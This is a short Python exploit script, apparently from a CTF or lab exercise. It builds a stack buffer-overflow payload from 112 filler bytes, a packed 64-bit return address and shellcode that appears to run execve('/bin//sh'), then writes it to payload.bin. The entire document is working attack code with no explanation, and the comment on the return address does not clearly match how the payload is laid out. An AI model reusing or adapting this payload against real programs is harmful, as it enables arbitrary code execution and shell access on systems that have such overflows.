#!/usr/bin/python
import struct

# Define the payload buffer
payload = b"A" * 112  # Fill the buffer with 112 A's

# Place the return address on the stack
return_address = struct.pack("<Q", 0x00000000004007d0)  # Address of the vulnerable function
payload += return_address

# Add the custom shellcode to the payload
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += shellcode

# Write the payload to a file
with open("payload.bin", "wb") as f:
    f.write(payload)

